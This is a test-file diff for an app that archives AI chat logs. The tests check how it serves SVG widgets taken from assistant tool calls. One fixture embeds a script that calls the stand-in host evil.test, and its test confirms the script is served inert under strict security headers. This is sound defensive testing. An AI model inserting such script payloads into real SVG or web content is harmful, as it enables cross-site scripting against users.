@@ -2143,3 +2143,159 @@ describe("GET /api/chats/:id/images/:ref — independent of the Source file", ()
     expect(body.equals(Buffer.from(PNG_BASE64, "base64"))).toBe(true);
   });
 });
+
+// A visualize widget call, archived the way ingestion would have stored it.
+function seedWidgetChat(
+  archive: ReturnType<typeof createArchiveRepository>,
+  opts: { sourceId: string; messageId: string; widgetCode: string }
+): { ref: string | null } {
+  const payload = {
+    type: "assistant",
+    message: {
+      role: "assistant",
+      content: [
+        {
+          type: "tool_use",
+          id: "toolu_w",
+          name: "mcp__visualize__show_widget",
+          input: { title: "diagram", widget_code: opts.widgetCode },
+        },
+      ],
+    },
+    uuid: opts.messageId,
+    timestamp: "2024-01-01T00:00:00Z",
+    sessionId: opts.sourceId,
+  };
+  const normalized = new ClaudeCodePlugin().normalize({
+    sourceId: opts.sourceId,
+    sourcePath: "/dev/null",
+    sourceLocator: "L1",
+    payload,
+  })!;
+  seedMessage(archive, {
+    sourceId: opts.sourceId,
+    messageId: opts.messageId,
+    role: "assistant",
+    ts: new Date(1_000),
+    text: normalized.text,
+    blocks: normalized.blocks,
+    payload,
+  });
+  const image = normalized.blocks.find((b) => b.type === "image");
+  return { ref: image?.type === "image" ? image.ref : null };
+}
+
+describe("GET /api/chats/:id/images/:ref — visualize widgets", () => {
+  it("serves the widget's own SVG source back", async () => {
+    const archive = createArchiveRepository({ dataDir });
+    const { ref } = seedWidgetChat(archive, {
+      sourceId: "wid1",
+      messageId: "m-wid",
+      widgetCode:
+        '<svg viewBox="0 0 680 200"><text class="t">Hello</text></svg>',
+    });
+    const app = createApp({
+      archive,
+      metadata: createMetadataRepository({ dataDir }),
+      tags: createTagRepository({ dataDir }),
+    });
+
+    const res = await app.request(
+      `/api/chats/${wireIdFor(archive, "wid1")}/images/${ref}`
+    );
+
+    expect(res.status).toBe(200);
+    expect(res.headers.get("content-type")).toBe("image/svg+xml");
+    const body = await res.text();
+    expect(body).toContain('<text class="t">Hello</text>');
+  });
+
+  // A screenshot's bytes came out of Raw verbatim, so they can be pinned in the
+  // browser forever. A widget's are rendered here from app code — the theme
+  // stylesheet and the viewBox sizing — so an upgrade must be able to change
+  // what the reader sees. Immutable would pin the old render for a year.
+  it("lets a rendered widget revalidate rather than pinning it forever", async () => {
+    const archive = createArchiveRepository({ dataDir });
+    const { ref } = seedWidgetChat(archive, {
+      sourceId: "wid4",
+      messageId: "m-wid",
+      widgetCode: '<svg viewBox="0 0 680 200"><g/></svg>',
+    });
+    const app = createApp({
+      archive,
+      metadata: createMetadataRepository({ dataDir }),
+      tags: createTagRepository({ dataDir }),
+    });
+    const url = `/api/chats/${wireIdFor(archive, "wid4")}/images/${ref}`;
+
+    const res = await app.request(url);
+
+    expect(res.status).toBe(200);
+    expect(res.headers.get("cache-control")).toBe("no-cache");
+    const etag = res.headers.get("etag");
+    expect(etag).toBeTruthy();
+
+    // Revalidation stays cheap: the reader re-renders nothing and the bytes do
+    // not travel twice.
+    const again = await app.request(url, {
+      headers: { "If-None-Match": etag! },
+    });
+    expect(again.status).toBe(304);
+  });
+
+  // The <img> tag is the real boundary: browsers refuse to run scripts or load
+  // external resources for an SVG in image context. The headers say the same
+  // thing a second time, so a future caller that reaches for the URL directly
+  // does not inherit a hole.
+  it("serves a script-bearing widget inert rather than scrubbing it", async () => {
+    const archive = createArchiveRepository({ dataDir });
+    const { ref } = seedWidgetChat(archive, {
+      sourceId: "wid2",
+      messageId: "m-wid",
+      widgetCode:
+        '<svg viewBox="0 0 680 200"><script>fetch("http://evil.test")</script></svg>',
+    });
+    const app = createApp({
+      archive,
+      metadata: createMetadataRepository({ dataDir }),
+      tags: createTagRepository({ dataDir }),
+    });
+
+    const res = await app.request(
+      `/api/chats/${wireIdFor(archive, "wid2")}/images/${ref}`
+    );
+
+    expect(res.status).toBe(200);
+    expect(res.headers.get("content-security-policy")).toBe(
+      "default-src 'none'; style-src 'unsafe-inline'; sandbox"
+    );
+    expect(res.headers.get("x-content-type-options")).toBe("nosniff");
+    // The archive is a faithful record: what the Agent wrote is what we keep.
+    expect(await res.text()).toContain('fetch("http://evil.test")');
+  });
+
+  // Normalize emits no image block for an HTML widget, so nothing in the pane
+  // asks for this URL. A hand-typed ref must not become a back door to serving
+  // one anyway.
+  it("404s on a ref pointing at an HTML widget", async () => {
+    const archive = createArchiveRepository({ dataDir });
+    const { ref } = seedWidgetChat(archive, {
+      sourceId: "wid3",
+      messageId: "m-wid",
+      widgetCode: '<div style="padding:8px">Before and after</div>',
+    });
+    expect(ref).toBeNull();
+
+    const app = createApp({
+      archive,
+      metadata: createMetadataRepository({ dataDir }),
+      tags: createTagRepository({ dataDir }),
+    });
+
+    const res = await app.request(
+      `/api/chats/${wireIdFor(archive, "wid3")}/images/m-wid.0`
+    );
+
+    expect(res.status).toBe(404);
+  });
+});
